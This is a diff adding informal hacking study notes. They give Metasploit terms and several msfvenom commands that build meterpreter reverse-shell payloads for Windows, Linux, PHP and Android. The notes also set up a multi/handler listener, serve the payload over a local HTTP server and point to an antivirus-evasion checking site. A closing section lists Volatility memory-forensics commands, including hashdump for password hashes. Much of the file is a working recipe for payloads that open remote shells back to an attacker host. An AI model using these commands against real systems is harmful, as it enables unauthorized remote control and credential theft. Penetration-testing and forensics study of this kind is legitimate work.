@@ -1,0 +1,62 @@
+Machine Hacking:
+
+Terminology : 
+
+Exploits  		: Tool used to take advantage of system weakness
+Payload   		: Sets of Malicious code
+Auxiliary 		: Supplementary tools and command for scanning purpose
+Encideers 		: Used to convert code or information
+Listeners 		: Malicious software that listen and hides in order to gain acccess
+Post-exploitation Code  : Helps test deeper penetration once inside
+Nops 			: Used with Buffer overflow
+
+
+Online Virus Scanner : https://antiscan.me/ 
+https://www.virustotal.com/gui/home/upload
+
+Lets learn to create a paylaod:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your IP> LPORT=<your port> -f exe -o filename.exe
+msfvenom -p linux/meterpreter/reverse_tcp LHOST=<your IP> LPORT=<your port> -f elf -o filename.elf
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<your IP> LPORT=<your port> -f raw -o filename.php
+msfvenom -p android/meterpreter/reverse_tcp LHOST=<your IP> LPORT=<your port> -f apk -o filename.apk
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.169.128 LPORT=4444 R > result.apk
+
+
+Lets setup a Listener :
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <your ip>
+set LPORT <your port>
+exploit
+
+$msfconsole
+$use exploit/multi/handler
+$set payload android/meterpreter/reverse_tcp
+$set LHOST 192.168.178.30
+$set LPORT 4444
+$exploit
+
+Source : https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom
+192.168.169.128
+
+Create a Payload >>> python3 -m http.server 8000 >>> msfconsole
+
+Votality:
+vol -f <filename> imageinfo
+vol -f <filename> --profile=<name> pslist
+vol -f <filename> --profile=<name> psscan
+vol -f <filename> --profile=<name> pstree
+vol -f <filename> --profile=<name> psxview
+vol -f <filename> --profile=<name> malfind --offset=ramloction [find sanduiche method: ABA ]
+vol -f <filename> --profile=<name> malfind --offset=ramloction -D .
+clamscan -o process.*
+vol -f <filename> --profile=<name> filescan -v | grep -i <name>
+vol -f <filename> --profile=<name> hashdump
+vol -f <filename> --profile=<name> netscan
+vol -f <filename> --profile=<name> enetscan
+vol -f <filename> --profile=<name> iehistory
+
+
+
+
